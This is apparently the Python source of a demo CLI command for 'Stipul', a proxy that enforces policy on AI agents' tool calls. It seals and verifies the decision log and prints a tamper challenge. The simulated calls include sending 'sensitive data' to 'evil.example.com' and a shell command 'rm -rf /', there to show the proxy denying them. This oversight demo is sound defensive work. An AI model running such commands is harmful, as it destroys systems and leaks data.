"""Packaged proof demo CLI."""

from __future__ import annotations

import argparse
import logging
import os
import tempfile
import uuid
from contextlib import contextmanager
from importlib.resources import as_file, files
from pathlib import Path
from typing import Iterator

from stipul.cli.color import colorize, GREEN, RED
from stipul.cli.io import CLIError, read_jsonl, sha256_bytes
from stipul.cli.verify_cmd import trust_status, verify_session
from stipul.writ.proxy.server import ProxyServer

_DEMO_TOKEN_SECRET = "stipul-demo-secret"  # nosec B105 - intentional non-production demo secret


def register(subparsers: argparse._SubParsersAction[argparse.ArgumentParser]) -> None:
    parser = subparsers.add_parser(
        "demo",
        help="Run packaged Stipul demo flows",
    )
    demo_subparsers = parser.add_subparsers(dest="demo_command")
    demo_subparsers.required = True

    proof_parser = demo_subparsers.add_parser(
        "proof",
        help="Run the packaged proof demo",
    )
    proof_parser.set_defaults(handler=run)


@contextmanager
def _demo_charter_path() -> Iterator[Path]:
    resource = files("stipul.demo").joinpath("demo_charter.yaml")
    with as_file(resource) as path:
        yield Path(path)


@contextmanager
def _suppress_startup_warning() -> Iterator[None]:
    logger = logging.getLogger("stipul.writ.proxy.startup")
    previous_level = logger.level
    logger.setLevel(logging.ERROR)
    try:
        yield
    finally:
        logger.setLevel(previous_level)


@contextmanager
def _demo_environment(root: Path) -> Iterator[None]:
    previous_home = os.environ.get("HOME")
    previous_token_secret = os.environ.get("STIPUL_TOKEN_SECRET")
    os.environ["HOME"] = str(root)
    os.environ["STIPUL_TOKEN_SECRET"] = _DEMO_TOKEN_SECRET
    try:
        yield
    finally:
        if previous_home is None:
            os.environ.pop("HOME", None)
        else:
            os.environ["HOME"] = previous_home

        if previous_token_secret is None:
            os.environ.pop("STIPUL_TOKEN_SECRET", None)
        else:
            os.environ["STIPUL_TOKEN_SECRET"] = previous_token_secret


def _run_proof_session(session_dir: Path, charter_path: Path) -> None:
    proxy: ProxyServer | None = None
    session_id = str(uuid.uuid4())
    with _demo_environment(session_dir.parent), _suppress_startup_warning():
        try:
            proxy = ProxyServer.from_contract_path(
                charter_path,
                # Canonical Chronicle events still require a UUID session_id.
                session_id=session_id,
                events_path=session_dir / "events.jsonl",
            )
            proxy.handle_tool_call(
                {
                    "tool_name": "filesystem.read",
                    "inputs": {"path": "/docs/report.md"},
                    "metadata": {"path": "/docs/report.md"},
                },
                lambda _request: {"content": "report data"},
            )
            proxy.handle_tool_call(
                {
                    "tool_name": "web.search",
                    "inputs": {
                        "query": "sensitive data",
                        "egress_target": "evil.example.com",
                    },
                    "metadata": {"egress_target": "evil.example.com"},
                },
                lambda _request: {"ok": True},
            )
            proxy.handle_tool_call(
                {
                    "tool_name": "shell.exec",
                    "inputs": {"command": "rm -rf /"},
                    "metadata": {"command": "rm -rf /"},
                },
                lambda _request: {"ok": True},
            )
        finally:
            if proxy is not None:
                proxy.close()


def _proof_events(session_dir: Path) -> list[dict[str, object]]:
    return read_jsonl(session_dir / "events.jsonl")


def _session_id(events: list[dict[str, object]]) -> str:
    for event in events:
        session_id = event.get("session_id")
        if isinstance(session_id, str) and session_id:
            return session_id
    raise CLIError("Demo produced no session_id in Chronicle events", exit_code=3)


def _display_reason(event: dict[str, object]) -> str | None:
    reason = event.get("reason")
    if not isinstance(reason, str) or not reason:
        return None
    if event.get("decision") == "allow" and reason == "risk_class":
        return "allowed_tool"
    return reason


def _replay_rows(events: list[dict[str, object]]) -> tuple[list[str], int]:
    def _short_timestamp(value: object) -> str:
        if not isinstance(value, str):
            return "??:??:??Z"
        parts = value.split("T", 1)
        if len(parts) != 2:
            return "??:??:??Z"
        time_part = parts[1]
        if time_part.endswith("Z"):
            candidate = time_part
        elif time_part.endswith("+00:00"):
            candidate = f"{time_part[:-6]}Z"
        else:
            return "??:??:??Z"
        if len(candidate) < 9 or candidate[2] != ":" or candidate[5] != ":" or not candidate.endswith("Z"):
            return "??:??:??Z"
        return candidate[:8] + "Z"

    lines: list[str] = []
    row_number = 0
    display_event_count = 0
    for event in events:
        event_type = event.get("event_type")
        if event_type in {"tool_call", "net_call"}:
            tool_name = event.get("tool_name")
            decision = event.get("decision")
            reason = _display_reason(event)
            ts_short = _short_timestamp(event.get("timestamp"))
            if not all(isinstance(value, str) and value for value in (tool_name, decision, reason)):
                continue
            color = ""
            if decision == "allow":
                color = GREEN
            elif decision == "deny":
                color = RED
            row_number += 1
            display_event_count += 1
            lines.append(
                f"  seq {row_number:<2}  {ts_short}  {colorize(decision, color):<7}  {tool_name:<20} reason: {reason}"
            )
            continue
        if event_type == "session_close":
            row_number += 1
            ts_short = _short_timestamp(event.get("timestamp"))
            lines.append(f"  seq {row_number:<2}  {ts_short}  {'close':<7}  session_close")
    return lines, display_event_count


def _render_output(session_dir: Path) -> str:
    events = _proof_events(session_dir)
    session_id = _session_id(events)
    replay_rows, display_event_count = _replay_rows(events)
    if not replay_rows:
        raise CLIError("Demo produced no replayable Chronicle events", exit_code=3)

    verification = verify_session(
        session_dir,
        contract_path=session_dir / "contract.json",
        public_key_path=session_dir / "public_key.pem",
    )
    if (
        verification.chain_result.status != "INTACT"
        or verification.seal_result.status != "VALID"
    ):
        raise CLIError(
            "Demo self-verification failed: "
            f"chain={verification.chain_result.status} "
            f"seal={verification.seal_result.status}",
            exit_code=2,
        )

    seal_path = (session_dir / "seal.json").resolve()
    session_path = session_dir.resolve()
    seal_fingerprint = sha256_bytes(seal_path.read_bytes())[:8]
    terminal_sequence_id = verification.seal_result.terminal_sequence_id
    if not isinstance(terminal_sequence_id, int) or terminal_sequence_id <= 0:
        raise CLIError(
            "Demo self-verification failed: missing terminal sequence id",
            exit_code=2,
        )
    trust = trust_status(
        chain_status=verification.chain_result.status,
        seal_status=verification.seal_result.status,
    )
    # Chronicle lifecycle events exist outside the operator-facing decision count.
    display_event_text = f"{display_event_count} decisions"
    inspect_cmd = f"cat {seal_path} | python3 -m json.tool"
    tamper_cmd = (
        "sed -i "
        f"'s/\"terminal_sequence_id\": {terminal_sequence_id}/\"terminal_sequence_id\": 999/' "
        f"{seal_path}"
    )
    verify_cmd = f"stipul verify {session_path}"

    lines = [
        "═══ Stipul Proof Demo ═══",
        "",
        f"Session: {session_id}",
        "",
        *replay_rows,
        "",
        f"Trust: {trust}",
        f"  Chain: {verification.chain_result.status}",
        f"  Seal:  {verification.seal_result.status}",
        f"  Decisions: {display_event_count}",
        (
            f"  Fingerprint: {session_id} | {verification.chain_result.status} | "
            f"{verification.seal_result.status} | {display_event_text} | {seal_fingerprint}"
        ),
        "",
        "═══ Tamper Challenge ═══",
        "",
        "The seal records a cryptographic attestation over the session evidence.",
        "Inspect it yourself, verify the session as-is, then change a recorded value and re-verify.",
        "",
        "Step 1 — View the current seal:",
        "",
        f"  {inspect_cmd}",
        "",
        "Step 2 — Verify the session as-is:",
        "",
        f"  {verify_cmd}",
        "",
        "Step 3 — Now tamper with the seal:",
        "",
        f"  {tamper_cmd}",
        "",
        "  Or try a different recorded value in seal.json and re-verify.",
        "",
        f"  sed -i 's/\"version\": 1/\"version\": 42/' {seal_path}",
        "",
        "Step 4 — Re-verify the session:",
        "",
        f"  {verify_cmd}",
        "",
        "Proof complete: enforcement decisions recorded, chained, and sealed.",
    ]
    return "\n".join(lines)


def run(_args: argparse.Namespace) -> int:
    try:
        demo_root = Path(tempfile.mkdtemp(prefix="stipul-proof-demo-")).resolve()
        session_dir = demo_root / "session"
        session_dir.mkdir(parents=True, exist_ok=True)
        with _demo_charter_path() as charter_path:
            _run_proof_session(session_dir, charter_path)
        print(_render_output(session_dir))
        return 0
    except CLIError:
        raise
    except (OSError, TypeError, ValueError) as exc:
        raise CLIError(str(exc), exit_code=3) from exc
